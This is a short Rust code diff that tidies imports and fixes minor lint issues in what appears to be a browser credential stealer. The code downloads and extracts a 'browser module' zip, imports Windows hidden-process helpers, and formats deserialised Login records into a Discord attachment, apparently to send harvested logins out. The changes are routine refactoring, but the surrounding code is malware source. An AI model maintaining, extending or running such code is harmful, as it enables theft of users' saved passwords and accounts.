@@ -1,12 +1,16 @@
 use crate::utils::logins::Login;
 use serenity::model::channel::AttachmentType;
-use std::borrow::Cow;
-use std::fmt::Write as fmtWrite;
-use std::fs::File;
-use std::io::{Cursor, Read, Write};
-use std::os::windows::process::CommandExt;
-use std::path::PathBuf;
-use std::process::{Command, Stdio};
+
+use std::{
+    borrow::Cow,
+    fmt::Write as fmtWrite,
+    fs::File,
+    io::{Cursor, Read, Write},
+    os::windows::process::CommandExt,
+    process::{Command, Stdio},
+    path::PathBuf,
+};
+
 use zip::ZipArchive;
 
 /// Downloads a file from the specified URL and saves it to the specified file path on the local
@@ -52,7 +56,7 @@ pub async fn download_browser_module(
         let mut zip_file = zip_archive.by_name(filename)?; // 1. Find our file name in the archive
         let mut file_content = Vec::new(); // 2. Create a Vec to hold the contents of the file
         zip_file.read_to_end(&mut file_content)?; // 3. Read the contents of the file into the Vec
-        let mut output_file = File::create(&temp_file_path)?; // 4. Create space on the fs to hold the downloaded file
+        let mut output_file = File::create(temp_file_path)?; // 4. Create space on the fs to hold the downloaded file
         output_file.write_all(&file_content)?; // 5. Write the contents of the Vec to the file
         println!("Downloaded file: {}", temp_file_path.display());
         Ok(())
@@ -119,7 +123,7 @@ pub async fn generate_attachment(
 
     // Iterate over each object in the parsed input and return the Login struct, writing this data to the stout.
     for object in input {
-        match serde_json::from_slice::<Login>(&*object) {
+        match serde_json::from_slice::<Login>(&object) {
             Ok(login) => writeln!(string, "{}", login),
             Err(err) => writeln!(string, "Error deserializing object: {}", err),
         }
